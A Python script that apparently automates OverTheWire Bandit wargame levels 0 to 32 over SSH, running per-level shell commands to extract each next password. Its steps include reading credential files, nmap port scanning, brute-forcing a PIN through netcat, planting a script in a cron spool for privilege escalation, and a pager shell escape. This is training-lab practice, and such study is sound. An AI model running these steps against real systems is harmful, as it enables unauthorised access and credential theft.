from paramiko import SSHClient, RSAKey, AutoAddPolicy
import re
from time import sleep
import sys

#from utils import getPassword

BANDIT26_PRIVATE_KEY_FILENAME = "bandit26_private_key"



def getPassword(commandOutput: bytes, password = None) -> str:
    '''
    This method gets the password from a output command bytes
    
    Regex: [A-z0-9]{32}
    '''

    print(commandOutput.decode())

    levelPassword = re.findall("[A-z0-9]{32}",commandOutput.decode())

    print(levelPassword)

    return levelPassword[-1]


def solveLevel0(client: SSHClient, password = None) -> str:
    '''

    '''
    stdin, stdout, stderr = client.exec_command('cat readme')

    password = getPassword(stdout.read())

    # Because they are file objects, they need to be closed
    stdin.close()
    stdout.close()
    stderr.close()

    return password


def solveLevel1(client: SSHClient, password = None) -> str:
    '''

    '''
    stdin, stdout, stderr = client.exec_command('cat ./-')

    password = getPassword(stdout.read())

    # Because they are file objects, they need to be closed
    stdin.close()
    stdout.close()
    stderr.close()

    return password

def solveLevel2(client: SSHClient, password = None) -> str:
    '''

    '''
    stdin, stdout, stderr = client.exec_command('cat "spaces in this filename"')

    password = getPassword(stdout.read())

    # Because they are file objects, they need to be closed
    stdin.close()
    stdout.close()
    stderr.close()

    return password

def solveLevel3(client: SSHClient, password = None) -> str:
    '''

    '''
    stdin, stdout, stderr = client.exec_command('cd inhere; cat ...Hiding-From-You')

    password = getPassword(stdout.read())

    # Because they are file objects, they need to be closed
    stdin.close()
    stdout.close()
    stderr.close()

    return password

def solveLevel4(client: SSHClient, password = None) -> str:
    '''

    '''
    stdin, stdout, stderr = client.exec_command('cd inhere; cat ./-file07')

    password = getPassword(stdout.read())

    # Because they are file objects, they need to be closed
    stdin.close()
    stdout.close()
    stderr.close()

    return password



def solveLevel5(client: SSHClient, password = None) -> str:
    '''

    '''
    stdin, stdout, stderr = client.exec_command('cd inhere/; output=$(find . -type f -size 1033c ! -executable); cat $output')

    password = getPassword(stdout.read())

    # Because they are file objects, they need to be closed
    stdin.close()
    stdout.close()
    stderr.close()

    return password


def solveLevel6(client: SSHClient, password = None) -> str:
    '''

    '''
    stdin, stdout, stderr = client.exec_command('output=$(find / -type f -size 33c -user bandit7 -group bandit6 2>/dev/null); cat $output')

    password = getPassword(stdout.read())

    # Because they are file objects, they need to be closed
    stdin.close()
    stdout.close()
    stderr.close()

    return password

def solveLevel7(client: SSHClient, password = None) -> str:
    '''

    '''
    stdin, stdout, stderr = client.exec_command('grep millionth data.txt')

    password = getPassword(stdout.read())

    # Because they are file objects, they need to be closed
    stdin.close()
    stdout.close()
    stderr.close()

    return password


def solveLevel8(client: SSHClient, password = None) -> str:
    '''

    '''
    stdin, stdout, stderr = client.exec_command('sort data.txt | uniq -u')

    password = getPassword(stdout.read())

    # Because they are file objects, they need to be closed
    stdin.close()
    stdout.close()
    stderr.close()

    return password

def solveLevel9(client: SSHClient, password = None) -> str:
    '''

    '''
    stdin, stdout, stderr = client.exec_command('strings data.txt | egrep "^={2}"')

    password = getPassword(stdout.read())

    # Because they are file objects, they need to be closed
    stdin.close()
    stdout.close()
    stderr.close()

    return password


def solveLevel10(client: SSHClient, password = None) -> str:
    '''

    '''
    stdin, stdout, stderr = client.exec_command('base64 -d data.txt')

    password = getPassword(stdout.read())

    # Because they are file objects, they need to be closed
    stdin.close()
    stdout.close()
    stderr.close()

    return password

def solveLevel11(client: SSHClient, password = None) -> str:
    '''

    '''
    stdin, stdout, stderr = client.exec_command("cat data.txt | tr 'A-Za-z' 'N-ZA-Mn-za-m'")

    #print(stdout.read())

    password = getPassword(stdout.read())

    # Because they are file objects, they need to be closed
    stdin.close()
    stdout.close()
    stderr.close()

    return password

def solveLevel12(client: SSHClient, password = None) -> str:
    '''

    '''
    
    stdin, stdout, stderr = client.exec_command("cd $(mktemp -d); cp /home/bandit12/data.txt .; xxd -r data.txt >> data.gz; gzip -d data.gz; bzip2 -d data; mv data.out data.gz; gzip -d data.gz; tar -xvf data; tar -xvf data5.bin; bzip2 -d data6.bin; tar -xvf data6.bin.out; gzip -d data8.bin; mv data8.bin data8.gz; gzip -d data8.gz; cat data8")

    #print(stdout.read())

    password = getPassword(stdout.read())

    # Because they are file objects, they need to be closed
    stdin.close()
    stdout.close()
    stderr.close()

    return password

def solveLevel13(client: SSHClient, password = None) -> str:
    '''

    '''

    stdin, stdout, stderr = client.exec_command('ssh -i sshkey.private bandit14@localhost -p 2220 -o "StrictHostKeyChecking no" cat /etc/bandit_pass/bandit14')

    password = getPassword(stdout.read())

    # Because they are file objects, they need to be closed
    stdin.close()
    stdout.close()
    stderr.close()

    return password


def solveLevel14(client: SSHClient, password = None) -> str:
    '''

    '''
    stdin, stdout, stderr = client.exec_command("cat /etc/bandit_pass/bandit14 | nc localhost 30000")

    password = getPassword(stdout.read())

    # Because they are file objects, they need to be closed
    stdin.close()
    stdout.close()
    stderr.close()

    return password



def solveLevel15(client: SSHClient, password = None) -> str:
    '''

    
    -quiet: No s_client output
    '''
    stdin, stdout, stderr = client.exec_command("cat /etc/bandit_pass/bandit15 | openssl s_client -connect localhost:30001 -ign_eof -quiet")

    password = getPassword(stdout.read())

    # Because they are file objects, they need to be closed
    stdin.close()
    stdout.close()
    stderr.close()

    return password


def solveLevel16(client: SSHClient, password = None) -> str:
    '''
    Command Explanation:

    We can divide this command in 4 parts:

        1-Creation of temp file to store the private key
            -privateKeyFile=$(mktemp)
        
        2-Gathering all ports which use tls and store it in a list called $ports
            -ports=$(nmap -p31000-32000 localhost --script ssl-cert | grep -B1 'ssl-cert' | grep tcp | cut -d '/' -f 1)

        3-For each port, open a connection and send to it the password of the current user which it is store in /etc/bandit_pass/bandit16
            -for port in $ports;
             do 
                cat /etc/bandit_pass/bandit16 | openssl s_client -connect localhost:$port -ign_eof -quiet;
             done 

             
        4-Get the private key and store it in a temp file created beforehand 
            -awk '/-----BEGIN RSA PRIVATE KEY-----/,/-----END RSA PRIVATE KEY-----/' > $privateKeyFile;

        5-Establish the ssh connection using the private key and show bandit17 current password
            -ssh -i $privateKeyFile bandit17@localhost -p 2220 -o 'StrictHostKeyChecking no' cat /etc/bandit_pass/bandit17"
    '''

    command = "privateKeyFile=$(mktemp); ports=$(nmap -p31000-32000 localhost --script ssl-cert | grep -B1 'ssl-cert' | grep tcp | cut -d '/' -f 1); for port in $ports; do cat /etc/bandit_pass/bandit16 | openssl s_client -connect localhost:$port -ign_eof -quiet; done | awk '/-----BEGIN RSA PRIVATE KEY-----/,/-----END RSA PRIVATE KEY-----/' > $privateKeyFile; ssh -i $privateKeyFile bandit17@localhost -p 2220 -o 'StrictHostKeyChecking no' cat /etc/bandit_pass/bandit17"

    stdin, stdout, stderr = client.exec_command(command)

    password = getPassword(stdout.read())

    # Because they are file objects, they need to be closed
    stdin.close()
    stdout.close()
    stderr.close()

    return password


def solveLevel17(client: SSHClient, password = None) -> str:
    '''

    Command Explanation:
    
    Show file differences and get the one which is in passwords.new

    '''

    command = "diff passwords.old passwords.new | grep '^>'"

    stdin, stdout, stderr = client.exec_command(command)

    password = getPassword(stdout.read())

    # Because they are file objects, they need to be closed
    stdin.close()
    stdout.close()
    stderr.close()

    return password


def solveLevel18(client: SSHClient, password = None) -> str:
    '''

    Command Explanation:
    
    Just show the readme content file

    '''

    command = "'"

    stdin, stdout, stderr = client.exec_command("cat readme")

    password = getPassword(stdout.read())

    # Because they are file objects, they need to be closed
    stdin.close()
    stdout.close()
    stderr.close()

    return password


def solveLevel19(client: SSHClient, password = None) -> str:
    '''

    Command Explanation:
    
    Just show the password contente file (/etc/bandit_pass/bandit20) by using the suid binary 

    '''

    command = "./bandit20-do cat /etc/bandit_pass/bandit20"

    stdin, stdout, stderr = client.exec_command(command)

    password = getPassword(stdout.read())

    # Because they are file objects, they need to be closed
    stdin.close()
    stdout.close()
    stderr.close()

    return password



def solveLevel20(client: SSHClient, password = None) -> str:
    '''

    Command Explanation:
    
    Firtly, open the port 65000 and send bandit20 password to it
    Secondly, open a connection to this port by using the suconnect binary

    '''

    command_1 = "nc -nlp 65000 < /etc/bandit_pass/bandit20 &"

    stdin, stdout, stderr = client.exec_command(command_1)

    command_2 = "./suconnect 65000"

    client.exec_command(command_2)

    password = getPassword(stdout.read())

    # Because they are file objects, they need to be closed
    stdin.close()
    stdout.close()
    stderr.close()

    return password


def solveLevel21(client: SSHClient, password = None) -> str:
    '''

    Command Explanation:
    
    If you see the bandit22 cron job (cat /etc/cron.d/cronjob_bandit22) you will notice that the bandit20 password is copy into a temp file in /tmp directory

    Just look at the content of that temporary file

    '''

    command = "passwordFile=$(cat /usr/bin/cronjob_bandit22.sh | grep /tmp/.* -o | uniq); cat $passwordFile"

    stdin, stdout, stderr = client.exec_command(command)

    password = getPassword(stdout.read())

    # Because they are file objects, they need to be closed
    stdin.close()
    stdout.close()
    stderr.close()

    return password


def solveLevel22(client: SSHClient, password = None) -> str:
    '''

    Command Explanation:
    
    If you see the bandit22 cron job (cat /etc/cron.d/cronjob_bandit22) you will notice that the bandit20 password is copy into a temp file in /tmp directory

    Just look at the content of that temporary file

    '''

    command = "tempFile=$(echo I am user bandit23 | md5sum | cut -d ' ' -f 1); cat /tmp/$tempFile"

    stdin, stdout, stderr = client.exec_command(command)

    password = getPassword(stdout.read())

    # Because they are file objects, they need to be closed
    stdin.close()
    stdout.close()
    stderr.close()

    return password



def solveLevel23(client: SSHClient, password = None) -> str:
    '''

    Command Explanation:
    
    If you see the bandit23 cron job (cat /etc/cron.d/cronjob_bandit22) you will notice that if we have write a script in /var/spool/bandit24/foo/ folder, it will be executed. 
    So, just create a tempfile, change the permissions of this to everyone can write and create a script to copy bandit24 password in that temporary file

    This might take a while because the cron job is executed every 60 seconds

    '''

    command = 'tempFile=$(mktemp); chmod 777 $tempFile; echo "cat /etc/bandit_pass/bandit24 >> $tempFile" > /var/spool/bandit24/foo/test.sh; chmod 777 /var/spool/bandit24/foo/test.sh; sleep 60; cat $tempFile;'

    stdin, stdout, stderr = client.exec_command(command)

    password = getPassword(stdout.read())

    # Because they are file objects, they need to be closed
    stdin.close()
    stdout.close()
    stderr.close()

    return password


def solveLevel24(client: SSHClient, password = None) -> str:
    '''

    Command Explanation:



    '''

    command = 'tempFile=$(mktemp); password=$(cat /etc/bandit_pass/bandit24); for i in {0..9}{0..9}{0..9}{0..9}; do echo $password $i >> /tmp/combinations.txt; done ; cat /tmp/combinations.txt | nc localhost 30002 > $tempFile; cat $tempFile'

    stdin, stdout, stderr = client.exec_command(command)

    password = getPassword(stdout.read())

    # Because they are file objects, they need to be closed
    stdin.close()
    stdout.close()
    stderr.close()

    return password


def solveLevel25(client: SSHClient, password = None) -> str:
    '''

    Command Explanation:
    '''

    def writePrivateKey(content: str):
        with open(BANDIT26_PRIVATE_KEY_FILENAME, "w") as file:
            file.write(content)

    def sshConnectionWithPrivateKey():
        private_key = RSAKey.from_private_key_file(BANDIT26_PRIVATE_KEY_FILENAME)
        
        client = SSHClient()

        client.set_missing_host_key_policy(AutoAddPolicy())

        client.connect("bandit.labs.overthewire.org", username="bandit26", port=2220, pkey=private_key, look_for_keys=False, allow_agent=False, )

        channel = client.invoke_shell(term="bash",width=5,height=5)

        password = ""

        sleep(1)

        while True:
            if channel.recv_ready():

                output = channel.recv(20000).decode()
                print(output, end='')

                # Si encontramos una línea que indica que 'more' está esperando entrada, enviamos una acción
                if "--More--" in output:
                    # Por ejemplo, enviamos un espacio para avanzar
                    channel.send('v')

                    sleep(0.3)

                    channel.send(':set shell=/bin/bash\n')

                    sleep(0.3)

                    channel.send(':shell\n')

                    sleep(0.3)

                    channel.send("./bandit27-do cat /etc/bandit_pass/bandit27\n")

                    sleep(1)

                    return getPassword(channel.recv(20000))

            # Si el canal está cerrado, salir del bucle
            if channel.exit_status_ready():
                break



        print("\n\nprinteando output)\n\n")

        print(password)

        sleep(2)

        channel.close()







            

    command = 'cat bandit26.sshkey'

    stdin, stdout, stderr = client.exec_command(command)

    writePrivateKey(stdout.read().decode())

    # Because they are file objects, they need to be closed
    stdin.close()
    stdout.close()
    stderr.close()

    password = sshConnectionWithPrivateKey()

    

    # Because they are file objects, they need to be closed
    stdin.close()
    stdout.close()
    stderr.close()

    return password




def solveLevel27(client: SSHClient, password = None) -> str:
    '''

    Command Explanation:



    '''

    command = 'tempDirectory=$(mktemp -d); cd $tempDirectory; GIT_SSH_COMMAND="ssh -o StrictHostKeyChecking=no -p 2220" git clone ssh://bandit27-git@localhost:2220/home/bandit27-git/repo\n'

    channel = client.invoke_shell()

    channel.send(f'{command}')

    while True:
            # Leer la salida del canal
            if channel.recv_ready():
                output = channel.recv(8000).decode('utf-8')
                print(output)

                # Buscar la solicitud de contraseña y enviarla
                if "bandit27-git@localhost's password" in output.lower():
                    channel.send(f'{password}\n')

                    channel.send("cd repo; cat README\n")

                    sleep(1)

                    return getPassword(channel.recv(20000))
                

                

def solveLevel28(client: SSHClient, password = None) -> str:
    '''

    Command Explanation:



    '''

    command = 'tempDirectory=$(mktemp -d); cd $tempDirectory; GIT_SSH_COMMAND="ssh -o StrictHostKeyChecking=no -p 2220" git clone ssh://bandit28-git@localhost:2220/home/bandit28-git/repo\n'

    git_command = "cd repo; commitNumber=$(git log | grep -A 2 'fix info leak' | grep commit | cut -d' ' -f2); git checkout $commitNumber;cat README.md\n"

    channel = client.invoke_shell()

    channel.send(f'{command}')

    while True:
            # Leer la salida del canal
            if channel.recv_ready():
                output = channel.recv(8000).decode('utf-8')
                print(output)

                # Buscar la solicitud de contraseña y enviarla
                if "bandit28-git@localhost's password" in output.lower():
                    channel.send(f'{password}\n')

                    sleep(1)

                    channel.send(git_command)

                    sleep(1)

                    return getPassword(channel.recv(20000))


    
def solveLevel29(client: SSHClient, password = None) -> str:
    '''
    Command Explanation:

    The password is not published on the actual branch. The player must change into development branch (dev).
    '''

    command = 'tempDirectory=$(mktemp -d); cd $tempDirectory; GIT_SSH_COMMAND="ssh -o StrictHostKeyChecking=no -p 2220" git clone ssh://bandit29-git@localhost:2220/home/bandit29-git/repo\n'

    git_command = "cd repo; git checkout origin/dev; cat README.md\n"

    channel = client.invoke_shell()

    channel.send(f'{command}')

    while True:
            # Leer la salida del canal
            if channel.recv_ready():
                output = channel.recv(8000).decode('utf-8')
                print(output)

                # Buscar la solicitud de contraseña y enviarla
                if "bandit29-git@localhost's password" in output.lower():
                    channel.send(f'{password}\n')

                    sleep(1)

                    channel.send(git_command)

                    sleep(1)

                    return getPassword(channel.recv(20000))



def solveLevel30(client: SSHClient, password = None) -> str:
    '''
    Command Explanation:

    The password is stored on a tag.
    '''

    command = 'tempDirectory=$(mktemp -d); cd $tempDirectory; GIT_SSH_COMMAND="ssh -o StrictHostKeyChecking=no -p 2220" git clone ssh://bandit30-git@localhost:2220/home/bandit30-git/repo\n'

    git_command = "cd repo; git show $(git tag)\n"

    channel = client.invoke_shell()

    channel.send(f'{command}')

    while True:
            # Leer la salida del canal
            if channel.recv_ready():
                output = channel.recv(8000).decode('utf-8')
                print(output)

                # Buscar la solicitud de contraseña y enviarla
                if "bandit30-git@localhost's password" in output.lower():
                    channel.send(f'{password}\n')

                    sleep(1)

                    channel.send(git_command)

                    sleep(1)

                    return getPassword(channel.recv(20000))



def solveLevel31(client: SSHClient, password = None) -> str:
    '''
    Command Explanation:

    The player must push the file key.txt
    '''

    command = 'tempDirectory=$(mktemp -d); cd $tempDirectory; GIT_SSH_COMMAND="ssh -o StrictHostKeyChecking=no -p 2220" git clone ssh://bandit31-git@localhost:2220/home/bandit31-git/repo\n'

    git_command = 'cd repo; touch key.txt; echo "May I come in?" > key.txt; git add key.txt -f; git commit -m "commit"; git push\n'

    channel = client.invoke_shell()

    channel.send(f'{command}')

    while True:
            # Leer la salida del canal
            if channel.recv_ready():
                output = channel.recv(8000).decode('utf-8')
                print(output)

                # Buscar la solicitud de contraseña y enviarla
                if "bandit31-git@localhost's password" in output.lower():
                    channel.send(f'{password}\n')

                    sleep(1)

                    channel.send(git_command)

                    sleep(1)

                    channel.send("yes\n")

                    sleep(1)

                    channel.send(f'{password}\n')

                    sleep(1)

                    return getPassword(channel.recv(20000))



def solveLevel32(client: SSHClient, password = None) -> str:
    '''
    Command Explanation:

    Escaping from a shell. This is a hard one. Why do you need this one...?
    '''

    command = '$0; cat /etc/bandit_pass/bandit33\n'

    stdin, stdout, stderr = client.exec_command(command)

    password = getPassword(stdout.read())

    # Because they are file objects, they need to be closed
    stdin.close()
    stdout.close()
    stderr.close()

    return password